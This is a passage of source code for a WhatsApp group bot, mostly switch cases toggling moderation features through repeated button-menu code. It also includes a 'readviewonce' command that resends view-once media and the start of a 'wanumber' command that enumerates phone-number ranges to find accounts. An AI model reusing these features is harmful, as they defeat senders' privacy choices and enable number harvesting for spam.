            break
            case 'readviewonce': case 'rvo': {
	if (!m.quoted) return replygcalya(`Reply to view once message`)
	if (m.quoted.mtype !== 'viewOnceMessageV2') return replygcalya(`This is not a view once message`)
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')
    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }
    if (/video/.test(type)) {
        return AlyaBotInc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return AlyaBotInc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
            case 'antiviewonce':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antiviewonce = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antiviewonce = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antispam':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antispam = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antispam = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antimedia':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antimedia = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antimedia = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antidocument':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               
               if (args[0] === 'on') {
                  db.data.chats[from].antidocument = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antidocument = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'anticontact':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
         
               if (args[0] === 'on') {
                  db.data.chats[from].anticontact = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].anticontact = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilocation':{
		         if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilocation = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilocation = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
               }
            break
            case 'antilink': {
               if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilink = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilink = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antilinkgc': {
               if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'antipromotion': {
               if (!m.isGroup) return AlyaStickGroup()
if (!isBotAdmins) return AlyaStickBotAdmin()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  db.data.chats[from].antipromotion = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antipromotion = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'welcome':
            case 'left': {
               if (!m.isGroup) return AlyaStickGroup()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  welcome = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  welcome = false
                  replygcalya(`${command} is disabled`)
               }else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
            case 'adminevent': {
               if (!m.isGroup) return AlyaStickGroup()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  adminevent = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  adminevent = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break
case 'groupevent': {
               if (!m.isGroup) return AlyaStickGroup()
if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
               if (args[0] === 'on') {
                  groupevent = true
                  replygcalya(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  groupevent = false
                  replygcalya(`${command} is disabled`)
               } else {
                	let msg = generateWAMessageFromContent(from, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${pushname}\nPlease click on the button below to use _*${command}*_ command`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
                ...(await prepareWAMessageMedia({ image : fs.readFileSync('./AlyaMedia/theme/alya.jpg')}, { upload: AlyaBotInc.waUploadToServer})), 
                  title: ``,
                  gifPlayback: true,
                  subtitle: ownername,
                  hasMediaAttachment: false  
                }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [
              {
                "name": "single_select",
                "buttonParamsJson": `{"title":"SELECT ENABLE/DISABLE ♨️",
"sections":[{"title":"CHOOSE ENABLE/DISABLE",
"rows":[{"header":"ENABLE ✅",
"title":"CHOOSE ",
"description":"ENABLE ✅",
"id":"${prefix+command} on"},
{"header":"DISABLE ❌",
"title":"CHOOSE ",
"description":"DISABLE ❌",
"id":"${prefix+command} off"}
]
}
]
}`
              }
           ],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: 'https://whatsapp.com/channel/0029VarnzwcGJP8HhlyFsO09',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
        })
    }
  }
}, { quoted: m })

await AlyaBotInc.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id
})
}
            }
            break 
            case 'invite': {
	if (!m.isGroup) return AlyaStickGroup()
	if (!isBotAdmins) return AlyaStickBotAdmin()
if (!text) return replygcalya(`Enter the number you want to invite to the group\n\nExample :\n*${prefix + command}* 2348100835767`)
if (text.includes('+')) return replygcalya(`Enter the number together without *+*`)
if (isNaN(text)) return replygcalya(`Enter only the numbers plus your country code without spaces`)
let group = m.chat
let link = 'https://chat.whatsapp.com/' + await AlyaBotInc.groupInviteCode(group)
      await AlyaBotInc.sendMessage(text+'@s.whatsapp.net', {text: `≡ *GROUP INVITATION*\n\nA user invites you to join this group \n\n${link}`, mentions: [m.sender]})
        replygcalya(` An invite link is sent to the user`) 
}
break
            case 'closetime':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcalya('*select:*\nsecond\nminute\nhour\n\n*Example*\n10 second')
                }
                replygcalya(`Close time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const close = `*Close time* group closed by admin\nnow only admin can send messages`
                    AlyaBotInc.groupSettingUpdate(m.chat, 'announcement')
                    replygcalya(close)
                }, timer)
                break
            case 'opentime':
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !AlyaTheQueen) return replygcalya(mess.admin)
                if (!isBotAdmins) return AlyaStickBotAdmin()
                if (args[1] == 'second') {
                    var timer = args[0] * `1000`
                } else if (args[1] == 'minute') {
                    var timer = args[0] * `60000`
                } else if (args[1] == 'hour') {
                    var timer = args[0] * `3600000`
                } else if (args[1] == 'day') {
                    var timer = args[0] * `86400000`
                } else {
                    return replygcalya('*select:*\nsecond\nminute\nhour\n\n*example*\n10 second')
                }
                replygcalya(`Open time ${q} starting from now`)
                setTimeout(() => {
                    var nomor = m.participant
                    const open = `*Open time* the group was opened by admin\n now members can send messages`
                    AlyaBotInc.groupSettingUpdate(m.chat, 'not_announcement')
                    replygcalya(open)
                }, timer)
                break
            case 'kick':
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!m.isGroup) return AlyaStickGroup()
                if (!isAdmins && !isGroupOwner && !AlyaTheQueen) return AlyaStickAdmin()
                if (!isBotAdmins) return AlyaStickBotAdmin()
                let blockwww = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'
                await AlyaBotInc.groupParticipantsUpdate(m.chat, [blockwww], 'remove')
                replygcalya(mess.done)
                break

                case "idgroup": case "groupid": {
if (!AlyaTheQueen) return AlyaStickOwner()
let getGroups = await AlyaBotInc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
let teks = `⬣ *GROUP LIST BELOW*\n\nTotal Group : ${anu.length} Group\n\n`
for (let x of anu) {
let metadata2 = await AlyaBotInc.groupMetadata(x)
teks += `◉ Name : ${metadata2.subject}\n◉ ID : ${metadata2.id}\n◉ Member : ${metadata2.participants.length}\n\n────────────────────────\n\n`
}
replygcalya(teks + `To Use Please Type Command ${prefix}pushcontact idgroup|teks\n\nBefore using, please first copy the group id above`)
}
break
case 'wanumber': case 'nowa': case 'searchno': case 'searchnumber':{
           	if (!text) return replygcalya(`Provide Number with last number x\n\nExample: ${prefix + command} 234912xxxxxxx`)
var inputnumber = text.split(" ")[0]
        
        replygcalya(`Searching for WhatsApp account in given range...`)
        function countInstances(string, word) {
            return string.split(word).length - 1
        }
        var number0 = inputnumber.split('x')[0]
        var number1 = inputnumber.split('x')[countInstances(inputnumber, 'x')] ? inputnumber.split('x')[countInstances(inputnumber, 'x')] : ''
        var random_length = countInstances(inputnumber, 'x')
        var randomxx
        if (random_length == 1) {
            randomxx = 10
        } else if (random_length == 2) {
            randomxx = 100
        } else if (random_length == 3) {
            randomxx = 1000
        }
        var text66 = `*==[ List of Whatsapp Numbers ]==*\n\n`
